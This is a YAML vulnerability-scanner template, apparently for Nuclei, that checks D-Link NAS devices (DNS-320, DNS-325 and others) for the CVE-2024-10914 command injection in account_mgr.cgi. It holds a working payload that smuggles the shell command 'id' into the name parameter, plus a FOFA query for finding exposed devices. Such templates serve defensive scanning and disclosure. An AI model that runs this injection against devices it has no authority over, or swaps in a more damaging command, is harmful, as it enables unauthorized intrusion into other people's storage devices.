id: d-link-nas-account_mgr-rce
info:
  name: d-link nas account_mgr.cgi - rce
  author: leadlife
  severity: critical
  description: 
  reference: 
    - https://github.com/wy876/POC/blob/9eefec0a4c311a412a86ab83bef3a25d3cb1766d/D-Link/D-Link-NAS%E6%8E%A5%E5%8F%A3account_mg%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-10914).md
  classification:
    cve-id: CVE-2024-10914
  metadata:
    verified: true
    fofa-query: body="Text:In order to access the ShareCenter"
    hunter-query: demo
    tips:
    repair:
    version: |
      DNS-320-版本 1.00
      DNS-320LW-版本 1.01.0914.2012
      DNS-325-版本 1.01和 1.02
      DNS-340L-版本 1.08
  tags: d-link,nas,rce,iot,dlink

http:
  - method: GET
    path:
      - "{{BaseURL}}/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;id;%27"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"

      - type: status
        status:
          - 200